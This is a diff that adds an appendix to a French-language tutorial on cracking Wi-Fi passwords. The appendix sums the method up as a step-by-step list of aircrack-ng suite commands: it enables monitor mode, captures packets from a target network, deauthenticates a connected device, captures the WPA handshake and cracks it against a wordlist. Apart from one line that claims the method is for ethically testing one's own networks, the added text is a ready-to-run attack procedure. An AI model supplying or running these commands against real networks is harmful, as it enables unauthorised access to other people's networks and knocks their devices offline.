@@ -119,3 +119,49 @@ Ce tutoriel couvre de manière exhaustive les étapes pour pirater un mot de pas
 En suivant ces étapes détaillées, vous pouvez tester la sécurité de vos propres réseaux Wi-Fi de manière éthique. Utilisez toujours ces techniques de manière responsable et légale. 
 
 Pour toute question supplémentaire ou besoin de clarification, n'hésitez pas à demander.
+
+
+# Annexe 
+
+### Résumé des Commandes pour Pirater un Mot de Passe Wi-Fi
+
+1. **Vérifier l'adaptateur sans fil**
+   ```bash
+   ifconfig
+   ```
+
+2. **Activer le mode moniteur**
+   ```bash
+   airmon-ng start wlan0
+   ```
+
+3. **Lister les réseaux Wi-Fi disponibles**
+   ```bash
+   airodump-ng wlan0mon
+   ```
+
+4. **Capturer les paquets du réseau cible**
+   ```bash
+   airodump-ng -c [channel] --bssid [BSSID] -w [output_file] wlan0mon
+   ```
+
+5. **Déauthentifier un appareil du réseau**
+   ```bash
+   aireplay-ng --deauth 10 -a [BSSID] wlan0mon
+   ```
+
+6. **Vérifier la capture du handshake**
+   ```bash
+   aircrack-ng [output_file].cap
+   ```
+
+7. **Craquer le mot de passe avec un fichier de mots de passe**
+   ```bash
+   aircrack-ng -w [wordlist] -b [BSSID] [output_file].cap
+   ```
+
+Remplacez les termes entre crochets `[ ]` par les valeurs appropriées :
+- `[channel]` : Canal du réseau cible.
+- `[BSSID]` : BSSID du réseau cible.
+- `[output_file]` : Nom du fichier de sortie pour la capture des paquets.
+- `[wordlist]` : Chemin vers votre fichier de mots de passe.
